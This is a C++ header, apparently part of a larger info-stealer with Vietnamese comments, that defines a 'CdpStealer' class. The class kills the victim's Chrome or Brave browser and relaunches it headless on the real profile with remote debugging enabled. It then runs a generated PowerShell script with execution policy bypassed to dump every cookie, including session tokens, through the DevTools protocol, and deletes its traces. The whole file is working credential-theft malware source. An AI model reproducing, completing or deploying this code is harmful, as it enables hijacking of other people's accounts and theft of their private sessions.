#pragma once
#include <windows.h>
#include <iostream>
#include <string>
#include <thread>
#include <vector>
#include <fstream>
#include <sstream>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <nlohmann/json.hpp>

#pragma comment(lib, "ws2_32.lib")

using json = nlohmann::json;

class CdpStealer
{
private:
    static std::string HttpGet(const std::string &host, int port, const std::string &path)
    {
        std::string result = "";
        SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock == INVALID_SOCKET)
            return "";

        sockaddr_in server;
        server.sin_family = AF_INET;
        server.sin_port = htons(port);
        inet_pton(AF_INET, host.c_str(), &server.sin_addr);

        DWORD timeout = 1000;
        setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (const char *)&timeout, sizeof(timeout));

        if (connect(sock, (sockaddr *)&server, sizeof(server)) < 0)
        {
            closesocket(sock);
            return "";
        }

        std::string req = "GET " + path + " HTTP/1.1\r\nHost: " + host + ":" + std::to_string(port) + "\r\nConnection: close\r\n\r\n";
        send(sock, req.c_str(), req.length(), 0);

        char buffer[4096];
        int len;
        while ((len = recv(sock, buffer, 4095, 0)) > 0)
        {
            buffer[len] = 0;
            result += buffer;
        }
        closesocket(sock);

        size_t bodyPos = result.find("\r\n\r\n");
        if (bodyPos != std::string::npos)
            return result.substr(bodyPos + 4);
        return result;
    }

public:
    static json StealCookiesViaCDP(const std::string &browserName)
    {
        std::string exePath = "";
        std::string userDataDir = "";

        char *localAppData = nullptr;
        size_t len = 0;
        _dupenv_s(&localAppData, &len, "LOCALAPPDATA");
        std::string appData(localAppData);
        free(localAppData);

        if (browserName == "brave")
        {
            exePath = "C:\\Program Files\\BraveSoftware\\Brave-Browser\\Application\\brave.exe";
            if (GetFileAttributesA(exePath.c_str()) == INVALID_FILE_ATTRIBUTES)
            {
                exePath = appData + "\\BraveSoftware\\Brave-Browser\\Application\\brave.exe";
            }
            userDataDir = appData + "\\BraveSoftware\\Brave-Browser\\User Data";
        }
        else if (browserName == "chrome")
        {
            exePath = "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe";
            if (GetFileAttributesA(exePath.c_str()) == INVALID_FILE_ATTRIBUTES)
            {
                exePath = "C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe";
            }
            userDataDir = appData + "\\Google\\Chrome\\User Data";
        }
        else
            return {{"status", "error"}, {"message", "Unsupported browser"}};

        if (GetFileAttributesA(exePath.c_str()) == INVALID_FILE_ATTRIBUTES)
        {
            return {{"status", "error"}, {"message", "Browser executable not found"}};
        }

        std::cout << "[CDP] Killing " << browserName << "...\n";
        std::string killCmd = "taskkill /F /IM " + browserName + ".exe >nul 2>&1";
        std::system(killCmd.c_str());
        Sleep(2000);

        std::string cmd = "\"" + exePath + "\" --remote-debugging-port=9222 --user-data-dir=\"" + userDataDir + "\" --headless --disable-gpu --no-first-run --disable-features=RendererCodeIntegrity";

        std::cout << "[CDP] Launching Debugger...\n";
        STARTUPINFOA si = {sizeof(si)};
        PROCESS_INFORMATION pi;
        if (!CreateProcessA(NULL, (LPSTR)cmd.c_str(), NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi))
        {
            return {{"status", "error"}, {"message", "Failed to launch browser"}};
        }

        std::string wsUrl = "";
        for (int i = 0; i < 5; i++)
        {
            std::cout << "[CDP] Connecting attempt " << (i + 1) << "...\n";
            Sleep(2000);

            std::string jsonList = HttpGet("127.0.0.1", 9222, "/json");
            if (!jsonList.empty())
            {
                try
                {
                    auto j = json::parse(jsonList);
                    if (j.is_array() && j.size() > 0)
                    {
                        for (const auto &tab : j)
                        {
                            if (tab.contains("webSocketDebuggerUrl"))
                            {
                                wsUrl = tab["webSocketDebuggerUrl"];
                                break;
                            }
                        }
                        if (!wsUrl.empty())
                            break;
                    }
                }
                catch (...)
                {
                }
            }
        }

        if (wsUrl.empty())
        {
            ::TerminateProcess(pi.hProcess, 0);
            ::CloseHandle(pi.hProcess);
            ::CloseHandle(pi.hThread);
            return {{"status", "error"}, {"message", "Failed to connect to Debug Port"}};
        }

        if (wsUrl.find("ws://127.0.0.1/") != std::string::npos && wsUrl.find(":9222") == std::string::npos)
        {
            wsUrl.replace(0, 16, "ws://127.0.0.1:9222/");
        }
        std::cout << "[CDP] WebSocket URL: " << wsUrl << "\n";

        // --- POWERSHELL SCRIPT (SỬ DỤNG MEMORY STREAM + LOOP) ---
        // Kỹ thuật này đảm bảo nhận đủ 100% dữ liệu dù lớn đến đâu
        std::string psScript = "try {\n";
        psScript += "$ws = New-Object System.Net.WebSockets.ClientWebSocket\n";
        psScript += "$cts = New-Object System.Threading.CancellationTokenSource\n";
        psScript += "$url = new-object System.Uri('" + wsUrl + "')\n";
        psScript += "$ws.ConnectAsync($url, $cts.Token).Wait()\n";

        psScript += "$cmd = '{\"id\": 1, \"method\": \"Network.getAllCookies\"}'\n";
        psScript += "$buffer = [System.Text.Encoding]::UTF8.GetBytes($cmd)\n";
        psScript += "$segment = New-Object System.ArraySegment[byte](, $buffer)\n";
        psScript += "$ws.SendAsync($segment, [System.Net.WebSockets.WebSocketMessageType]::Text, $true, $cts.Token).Wait()\n";

        // Tạo Buffer và MemoryStream để gom dữ liệu
        psScript += "$rcvBuffer = New-Object byte[] 10240\n";
        psScript += "$rcvSegment = New-Object System.ArraySegment[byte](, $rcvBuffer)\n";
        psScript += "$ms = New-Object System.IO.MemoryStream\n";

        psScript += "do {\n";
        psScript += "    $result = $ws.ReceiveAsync($rcvSegment, $cts.Token)\n";
        psScript += "    $result.Wait()\n";
        psScript += "    $ms.Write($rcvBuffer, 0, $result.Result.Count)\n";
        psScript += "} while (-not $result.Result.EndOfMessage)\n";

        // Chuyển toàn bộ MemoryStream thành chuỗi
        psScript += "$str = [System.Text.Encoding]::UTF8.GetString($ms.ToArray())\n";
        psScript += "[System.IO.File]::WriteAllText('cdp_res.txt', $str)\n";

        psScript += "$ws.CloseAsync([System.Net.WebSockets.WebSocketCloseStatus]::NormalClosure, \"\", $cts.Token)\n";
        psScript += "$ms.Dispose()\n";

        psScript += "} catch { [System.IO.File]::WriteAllText('cdp_res.txt', \"PS_ERROR: \" + $_.Exception.Message) }\n";

        std::string psFile = "cdp_dump.ps1";
        std::ofstream out(psFile);
        out << psScript;
        out.close();

        std::cout << "[CDP] Executing PS script (MemoryStream Loop)...\n";
        std::system("powershell -ExecutionPolicy Bypass -File cdp_dump.ps1");

        std::ifstream resFile("cdp_res.txt");
        std::stringstream buffer;
        buffer << resFile.rdbuf();
        std::string finalJson = buffer.str();
        resFile.close();

        std::remove(psFile.c_str());
        std::remove("cdp_res.txt");

        ::TerminateProcess(pi.hProcess, 0);
        ::CloseHandle(pi.hProcess);
        ::CloseHandle(pi.hThread);

        json resultCookies = json::array();
        bool parseSuccess = false;

        if (finalJson.find("PS_ERROR:") != std::string::npos)
        {
            std::cout << "[CDP] PS Error: " << finalJson << "\n";
            return {{"status", "error"}, {"message", "PowerShell Script Failed"}};
        }

        try
        {
            size_t jsonStart = finalJson.find("{\"id\":1");
            if (jsonStart != std::string::npos)
            {
                // Tự động bỏ qua các ký tự rác nếu có ở cuối
                auto raw = json::parse(finalJson.substr(jsonStart));

                if (raw.contains("result") && raw["result"].contains("cookies"))
                {
                    for (const auto &c : raw["result"]["cookies"])
                    {
                        double expiry = -1;
                        if (c.contains("expires"))
                            expiry = c["expires"];

                        resultCookies.push_back({{"domain", c["domain"]},
                                                 {"name", c["name"]},
                                                 {"value", c["value"]},
                                                 {"path", c["path"]},
                                                 {"secure", c["secure"]},
                                                 {"expirationDate", expiry}});
                    }
                    parseSuccess = true;
                }
            }
        }
        catch (const std::exception &e)
        {
            std::cout << "[CDP] JSON Exception: " << e.what() << "\n";
        }

        if (!parseSuccess)
        {
            std::cout << "[CDP] Parse Fail. Raw Length: " << finalJson.length() << "\n";
            // In thử 100 ký tự đầu và cuối để debug
            if (finalJson.length() > 200)
            {
                std::cout << "Start: " << finalJson.substr(0, 100) << "\n";
                std::cout << "End: " << finalJson.substr(finalJson.length() - 100) << "\n";
            }
            return {{"status", "error"}, {"message", "Empty or Invalid JSON from browser"}};
        }

        std::cout << "[CDP] Success! Extracted " << resultCookies.size() << " cookies.\n";

        return {
            {"status", "success"},
            {"browser", browserName},
            {"data", resultCookies}};
    }
};